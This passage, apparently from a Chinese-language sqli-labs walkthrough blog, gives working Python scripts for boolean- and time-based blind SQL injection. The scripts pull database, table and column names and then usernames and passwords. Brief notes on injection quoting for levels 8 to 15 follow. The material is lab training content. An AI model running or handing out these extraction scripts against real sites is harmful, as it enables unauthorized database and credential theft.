class=\"keyword\">in</span> keylist: payload12=<span class=\"string\">&quot;1&#x27;)) and substr((select group_concat(concat(&quot;</span> + col1 + <span class=\"string\">&quot;,&#x27;^&#x27;,&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">                + col2 + <span class=\"string\">&quot;)) from &quot;</span> + table + <span class=\"string\">&quot;),&quot;</span> + <span class=\"built_in\">str</span>( i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload12, &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">                content=content + c <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the content is &quot;</span> + <span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\">CurrentDatabase7()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#调用函数即可,CurrentDatabase()查看当前数据库</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#Tables7()查看当前数据库的所有表</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#Columns7(&#x27;表名&#x27;)查看该表的所有字段</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#Content7(&#x27;表名&#x27;,&#x27;字段1&#x27;,&#x27;字段2&#x27;)</span></span><br></pre></td></tr></table></figure>\n<p>这里借鉴了大佬的脚本自己修改了一些内容，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0phY3F1ZWxpblhpYW5nL3NxbGlfYm9vbA==\"> 脚本地址</span></p>\n<h2 id=\"less8\"><a class=\"markdownIt-Anchor\" href=\"#less8\">#</a> less8</h2>\n<p>与上一关一样的布尔盲注，闭合情况变成了 1’而不是 1’))</p>\n<h2 id=\"less9\"><a class=\"markdownIt-Anchor\" href=\"#less9\">#</a> less9</h2>\n<p>此关不管输入是否正确都回显一个页面，即 id=1 (存在) 和 id=-1 (不存在) 都返回一样的回显，需要用到时间盲注，<a href=\"https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/\"> 时间盲注基础</a><br>\n先试探它的闭合情况</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and if(1,sleep(1),1)--+</span><br><span class=\"line\">?id=1&#x27; and if(1,sleep(1),1)--+  这个是</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests  </span><br><span class=\"line\">  </span><br><span class=\"line\">url = <span class=\"string\">&quot;http://sqli-labs:100/Less-9/&quot;</span> <span class=\"comment\"># 有可利用漏洞的url，根据实际情况填写  </span></span><br><span class=\"line\">headers = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;User-Agent&quot;</span>: <span class=\"string\">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&quot;</span>,  </span><br><span class=\"line\">&#125; <span class=\"comment\"># http request报文头部，根据实际情况填写  </span></span><br><span class=\"line\">  </span><br><span class=\"line\">keylist = [<span class=\"built_in\">chr</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">33</span>, <span class=\"number\">127</span>)] <span class=\"comment\"># 包括数字、大小写字母、可见特殊字符  </span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">CurrentDatabaseTime</span>():  </span><br><span class=\"line\">n = <span class=\"number\">10</span> <span class=\"comment\"># 预测当前数据库名称最大可能的长度，根据实际情况填写  </span></span><br><span class=\"line\">k = <span class=\"number\">0</span>  </span><br><span class=\"line\">j = n // <span class=\"number\">2</span>  </span><br><span class=\"line\">length = <span class=\"number\">0</span>  </span><br><span class=\"line\">db = <span class=\"built_in\">str</span>()  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\"><span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:  </span><br><span class=\"line\">payload1 = <span class=\"string\">&quot;1&#x27; and if(length(database())&gt;&quot;</span> + <span class=\"built_in\">str</span>(j) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span> <span class=\"comment\"># 所有payload根据实际情况填写  </span></span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload1,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers,  </span><br><span class=\"line\">timeout=<span class=\"number\">2</span>) <span class=\"comment\"># 本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样  </span></span><br><span class=\"line\">k = k  </span><br><span class=\"line\">n = j  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">n = n  </span><br><span class=\"line\">k = j  </span><br><span class=\"line\">j = (n - k) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>:  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>):  </span><br><span class=\"line\">payload2 = <span class=\"string\">&quot;1&#x27; and if(length(database())=&quot;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload2,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">length = i  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of current database contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>):  </span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:  </span><br><span class=\"line\">payload3 = <span class=\"string\">&quot;1&#x27; and if(substring(database(),&quot;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload3,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">db = db + c  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of current database is &quot;</span> + <span class=\"built_in\">str</span>(db))  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">TablesTime</span>():  </span><br><span class=\"line\">n = <span class=\"number\">100</span> <span class=\"comment\"># 预测当前数据库中所有表名称最大可能的长度，根据实际情况填写  </span></span><br><span class=\"line\">k = <span class=\"number\">0</span>  </span><br><span class=\"line\">j = n // <span class=\"number\">2</span>  </span><br><span class=\"line\">length = <span class=\"number\">0</span>  </span><br><span class=\"line\">tname = <span class=\"built_in\">str</span>()  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\"><span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:  </span><br><span class=\"line\">payload4 = <span class=\"string\">&quot;1&#x27; and if((length((select group_concat(table_name) from information_schema.tables where table_schema = database())))&gt;&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">j) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload4,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers,  </span><br><span class=\"line\">timeout=<span class=\"number\">2</span>) <span class=\"comment\"># 本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样  </span></span><br><span class=\"line\">k = k  </span><br><span class=\"line\">n = j  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">n = n  </span><br><span class=\"line\">k = j  </span><br><span class=\"line\">j = (n - k) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>:  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>):  </span><br><span class=\"line\">payload5 = <span class=\"string\">&quot;1&#x27; and if((length((select group_concat(table_name) from information_schema.tables where table_schema = database())))=&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">i) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload5,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">length = i  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all tables in current database contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>):  </span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:  </span><br><span class=\"line\">payload6 = <span class=\"string\">&quot;1&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload6,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">tname = tname + c  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all tables in current database is &quot;</span> + <span class=\"built_in\">str</span>(tname))  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ColumnsTime</span>():  </span><br><span class=\"line\">n = <span class=\"number\">200</span> <span class=\"comment\"># 预测某个表所有列名称最大可能的长度，根据实际情况填写  </span></span><br><span class=\"line\">k = <span class=\"number\">0</span>  </span><br><span class=\"line\">j = n // <span class=\"number\">2</span>  </span><br><span class=\"line\">length = <span class=\"number\">0</span>  </span><br><span class=\"line\">cname = <span class=\"built_in\">str</span>()  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\"><span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:  </span><br><span class=\"line\">payload7 = <span class=\"string\">&quot;1&#x27; and if((length((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;)))&gt;&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">j) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload7,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers,  </span><br><span class=\"line\">timeout=<span class=\"number\">2</span>) <span class=\"comment\"># 本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样  </span></span><br><span class=\"line\">k = k  </span><br><span class=\"line\">n = j  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">n = n  </span><br><span class=\"line\">k = j  </span><br><span class=\"line\">j = (n - k) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>:  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>):  </span><br><span class=\"line\">payload8 = <span class=\"string\">&quot;1&#x27; and if((length((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;)))=&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">i) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload8,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">length = i  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all columns in current table contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>):  </span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:  </span><br><span class=\"line\">payload9 = <span class=\"string\">&quot;1&#x27; and if(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27;),&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload9,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">cname = cname + c  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of all columns in current table is &quot;</span> + <span class=\"built_in\">str</span>(cname))  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ContentTime</span>():  </span><br><span class=\"line\">n = <span class=\"number\">200</span> <span class=\"comment\"># 预测期望获取的数据的最大可能的长度，根据实际情况填写  </span></span><br><span class=\"line\">k = <span class=\"number\">0</span>  </span><br><span class=\"line\">j = n // <span class=\"number\">2</span>  </span><br><span class=\"line\">length = <span class=\"number\">0</span>  </span><br><span class=\"line\">content = <span class=\"built_in\">str</span>()  </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:  </span><br><span class=\"line\"><span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:  </span><br><span class=\"line\">payload10 = <span class=\"string\">&quot;1&#x27; and if((length((select group_concat(concat(username,&#x27;^&#x27;,password)) from users)))&gt;&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">j) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload10,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers,  </span><br><span class=\"line\">timeout=<span class=\"number\">2</span>) <span class=\"comment\"># 本脚本根据GET型注入编写，遇到POST型可修改改行方法和参数，其他所有函数中同样  </span></span><br><span class=\"line\">k = k  </span><br><span class=\"line\">n = j  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">n = n  </span><br><span class=\"line\">k = j  </span><br><span class=\"line\">j = (n - k) // <span class=\"number\">2</span>  </span><br><span class=\"line\"><span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>:  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>):  </span><br><span class=\"line\">payload11 = <span class=\"string\">&quot;1&#x27; and if((length((select group_concat(concat(username,&#x27;^&#x27;,password)) from users)))=&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">i) + <span class=\"string\">&quot;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload11,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">length = i  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"keyword\">else</span>:  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the content contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>)  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>):  </span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:  </span><br><span class=\"line\">payload12 = <span class=\"string\">&quot;1&#x27; and if(substr((select group_concat(concat(username,&#x27;^&#x27;,password)) from users),&quot;</span> + <span class=\"built_in\">str</span>(  </span><br><span class=\"line\">i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;,sleep(3),1)-- ss&quot;</span>  </span><br><span class=\"line\">param = &#123;  </span><br><span class=\"line\"><span class=\"string\">&quot;id&quot;</span>: payload12,  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">try</span>:  </span><br><span class=\"line\">response = requests.get(url, params=param, headers=headers, timeout=<span class=\"number\">2</span>)  </span><br><span class=\"line\"><span class=\"keyword\">except</span>:  </span><br><span class=\"line\">content = content + c  </span><br><span class=\"line\"><span class=\"keyword\">break</span>  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;the content is &quot;</span> + <span class=\"built_in\">str</span>(content))  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">#CurrentDatabaseTime()  </span></span><br><span class=\"line\"><span class=\"comment\">#TablesTime()  </span></span><br><span class=\"line\">ColumnsTime()  </span><br><span class=\"line\"><span class=\"comment\">#ContentTime()</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"less-10\"><a class=\"markdownIt-Anchor\" href=\"#less-10\">#</a> less-10</h2>\n<p>闭合条件变成 1’–+ 的时间盲注</p>\n<h2 id=\"less11\"><a class=\"markdownIt-Anchor\" href=\"#less11\">#</a> less11</h2>\n<p>输入？id=1 发现 url 地址没有显示，抓包发现 post 方式<br>\n uname=11&amp;passwd=1&amp;submit=Submit<br>\n 判断字符型<br>\n接下来用基本的 union 注入就欧克</p>\n<h2 id=\"less12\"><a class=\"markdownIt-Anchor\" href=\"#less12\">#</a> less12</h2>\n<p>&quot;) 型，联合注入</p>\n<h2 id=\"less13\"><a class=\"markdownIt-Anchor\" href=\"#less13\">#</a> less13</h2>\n<p>)’ # 加上报错注入</p>\n<h2 id=\"less14\"><a class=\"markdownIt-Anchor\" href=\"#less14\">#</a> less14</h2>\n<p>&quot;# 加上报错注入</p>\n<h2 id=\"less15\"><a class=\"markdownIt-Anchor\" href=\"#less15\">#</a> less15</h2>\n<p>不显示报错信息只能盲注<br>\n单引号字符型的布尔盲注:<br>\n1’ 